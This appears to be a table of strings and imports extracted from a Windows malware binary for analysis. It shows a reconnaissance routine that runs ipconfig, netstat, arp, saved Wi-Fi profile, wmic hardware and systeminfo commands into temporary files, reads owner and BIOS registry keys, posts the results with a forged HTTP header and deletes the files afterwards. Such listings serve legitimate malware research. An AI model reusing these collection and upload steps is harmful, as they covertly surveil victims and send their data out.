reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x40150f	0x407000	string	0x401509	libgcj-13.dll
0x401516	0x40a2d0	import	0x401509	KERNEL32.dll.GetModuleHandleA
0x401528	0x40700e	string	0x401509	_Jv_RegisterClasses
0x401533	0x40a2d4	import	0x401509	KERNEL32.dll.GetProcAddress
0x401773	0x407065	string	0x4016a3	%%%2X
0x40193d	0x40706b	string	0x40181b	WSAStartup Failed.
0x401980	0x40707e	string	0x40181b	NXdomain
0x401ac3	0x407088	string	0x40181b	POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)\r\nReferer: http://%s%s\r\nCokkie: xtl_s=%s\r\nContent-Length: 207\r\n\r\n
0x401b57	0x407120	string	0x40181b	Basic realm=
0x401c0c	0x407130	string	0x40181b	POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)\r\nReferer: http://%s%s\r\nCokkie: xtl_s=%s\r\nContent-Length: 207\r\n
0x401dc4	0x4071c6	string	0x40181b	tws_action=%s&
0x401e0c	0x4071d8	string	0x40181b	SOFTWARE\Microsoft\Windows NT\CurrentVersion
0x401e5e	0x407205	string	0x40181b	RegisteredOwner
0x401fda	0x407215	string	0x40181b	RegisteredOrganization
0x40201e	0x407215	string	0x40181b	RegisteredOrganization
0x40220f	0x4071d8	string	0x40181b	SOFTWARE\Microsoft\Windows NT\CurrentVersion
0x402261	0x40722c	string	0x40181b	InstallDate
0x4022a5	0x40722c	string	0x40181b	InstallDate
0x4023af	0x40723c	string	0x40181b	%d/%d/%d_%d:%d:%d%s
0x4025a0	0x407250	string	0x40181b	HARDWARE\DESCRIPTION\System\BIOS
0x4025f2	0x407271	string	0x40181b	BIOSVendor
0x402636	0x407271	string	0x40181b	BIOSVendor
0x402698	0x40727c	string	0x40181b	BIOSVersion
0x4026dc	0x40727c	string	0x40181b	BIOSVersion
0x40273e	0x407288	string	0x40181b	BIOSReleaseDate
0x402782	0x407288	string	0x40181b	BIOSReleaseDate
0x40297d	0x407298	string	0x40181b	HTTP/1.1 200 OK\r\n
0x4029eb	0x407088	string	0x40181b	POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)\r\nReferer: http://%s%s\r\nCokkie: xtl_s=%s\r\nContent-Length: 207\r\n\r\n
0x402a01	0x4072ac	string	0x40181b	dir "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" > ohagi.txt 2>&1
0x402a38	0x407311	string	0x40181b	ohagi.txt
0x402c01	0x40731b	string	0x40181b	doskey /h >> ohagi.txt
0x402c0d	0x407334	string	0x40181b	dir "C:\Program Files\*.exe" /s /tc /od >> ohagi.txt
0x402c19	0x40736c	string	0x40181b	dir "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Recent"/s /tc /od >> ohagi.txt 2>&1
0x402c2e	0x4073cc	string	0x40181b	dir "C:\Documents and Settings\%username%\Recent" /s /tc /od >> ohagi.txt 2>&1
0x402c3d	0x407311	string	0x40181b	ohagi.txt
0x402c49	0x40741c	string	0x40181b	ipconfig /all >> ohagi.txt 2>&1
0x402c55	0x40743c	string	0x40181b	netstat -a >> ohagi.txt 2>&1
0x402c61	0x407459	string	0x40181b	arp -a >> ohagi.txt 2>&1
0x402c6d	0x407474	string	0x40181b	netsh wlan show profiles >> ohagi.txt 2>&1
0x402c79	0x40749f	string	0x40181b	echo XXX >> ohagi.txt 2>&1
0x402c85	0x4074bc	string	0x40181b	echo ANNIE-DAEMON >> ohagi.txt 2>&1
0x402c99	0x407311	string	0x40181b	ohagi.txt
0x402ebf	0x4074e2	string	0x40181b	del ohagi.txt
0x402f13	0x407298	string	0x40181b	HTTP/1.1 200 OK\r\n
0x402f81	0x407088	string	0x40181b	POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)\r\nReferer: http://%s%s\r\nCokkie: xtl_s=%s\r\nContent-Length: 207\r\n\r\n
0x402f97	0x4074f0	string	0x40181b	%systemroot%\system32\wbem\wmic path Win32_keyboard get DeviceID, Name, NumberOfFunctionKeys, Layout | find /v ""> ohagi1.txt 2>&1
0x402fa3	0x407574	string	0x40181b	%systemroot%\system32\wbem\wmic path Win32_PointingDevice get DeviceID, Name, Manufacturer, HardwareType | find /v "">> ohagi1.txt 2>&1
0x402faf	0x4075fc	string	0x40181b	%systemroot%\system32\wbem\wmic path win32_videocontroller get DeviceID, CurrentHorizontalResolution, CurrentVerticalResolution | find /v "">> ohagi1.txt 2>&1
0x402fbb	0x40769c	string	0x40181b	%systemroot%\system32\wbem\wmic path Win32_DesktopMonitor get DeviceID, MonitorType, ScreenHeight, ScreenWidth, MonitorManufacturer | find /v "">> ohagi1.txt 2>&1
0x402fc7	0x407740	string	0x40181b	%systemroot%\system32\wbem\wmic path Win32_PnPEntity where (DeviceID like "%USB%") get DeviceID, Name | find /v "">> ohagi1.txt 2>&1
0x402fd3	0x4077c8	string	0x40181b	%systemroot%\system32\wbem\wmic path win32_baseboard get manufacturer, product, version, serialnumber | find /v "">> ohagi1.txt 2>&1
0x402fdf	0x407850	string	0x40181b	%systemroot%\system32\wbem\wmic path win32_BIOS get manufacturer, releasedate, smbiosbiosversion | find /v "">> ohagi1.txt 2>&1
0x402feb	0x4078d0	string	0x40181b	%systemroot%\system32\wbem\wmic path win32_OperatingSystem get Installdate, serialnumber, registereduser, Locale | find /v "">> ohagi1.txt 2>&1
0x402ff7	0x407964	string	0x40181b	%systemroot%\system32\wbem\wmic ntevent where "(logfile='system' and EventCode='6005')" GET Message, TimeGenerated | find /v "">> ohagi1.txt 2>&1
0x403003	0x4079f8	string	0x40181b	echo "---Total of files---" >> ohagi1.txt 2>&1
0x40300f	0x407a28	string	0x40181b	dir /a-d /b /s "C:\Windows" | find /c /v "" >> ohagi1.txt 2>&1
0x40301b	0x407a67	string	0x40181b	echo XXX >> ohagi1.txt 2>&1
0x403027	0x407a84	string	0x40181b	echo ANNIE-DAEMON >> ohagi1.txt 2>&1
0x40303b	0x407aa9	string	0x40181b	ohagi1.txt
0x403261	0x407ab4	string	0x40181b	del ohagi1.txt
0x4032b5	0x407298	string	0x40181b	HTTP/1.1 200 OK\r\n
0x403323	0x407088	string	0x40181b	POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)\r\nReferer: http://%s%s\r\nCokkie: xtl_s=%s\r\nContent-Length: 207\r\n\r\n
0x403339	0x407ac4	string	0x40181b	%systemroot%\system32\systeminfo > ohagi.txt 2>&1
0x403345	0x407af8	string	0x40181b	%systemroot%\system32\getmac >> ohagi.txt 2>&1
0x403351	0x40749f	string	0x40181b	echo XXX >> ohagi.txt 2>&1
0x40335d	0x4074bc	string	0x40181b	echo ANNIE-DAEMON >> ohagi.txt 2>&1
0x403371	0x407311	string	0x40181b	ohagi.txt
0x403597	0x4074e2	string	0x40181b	del ohagi.txt
0x4036bb	0x407b27	string	0x40181b	conan.bmp
0x4036d7	0x407b27	string	0x40181b	conan.bmp
0x403781	0x407b34	string	0x40181b	del conan.bmp
0x4038be	0x407b44	string	0x403884	USERNAME
0x403b19	0x407b57	string	0x403884	.txt
0x403cac	0x407b64	string	0x403c5a	Total Physical Memory : %*ld MB \n
0x403cd1	0x407b88	string	0x403c5a	Free Physical Memory : %*ld MB \n
0x403cfd	0x407bac	string	0x403c5a	Using Physical Memory : %*ld MB \n
0x403d22	0x407bd0	string	0x403c5a	Total Virtual Memory : %*ld MB \n
0x403d47	0x407bf4	string	0x403c5a	Free Virtual Memory : %*ld MB \n
0x403d73	0x407c18	string	0x403c5a	Using Virtual Memory : %*ld MB \n
0x403d9d	0x4071d8	string	0x403c5a	SOFTWARE\Microsoft\Windows NT\CurrentVersion
0x403de9	0x407c3a	string	0x403c5a	ProductId
0x403e27	0x407c3a	string	0x403c5a	ProductId
0x403e65	0x407c3a	string	0x403c5a	ProductId
0x403e8d	0x407c44	string	0x403c5a	"%s"
0x403ee2	0x407c4c	string	0x403c5a	SYSTEM\CurrentControlSet\Control\SystemInformation
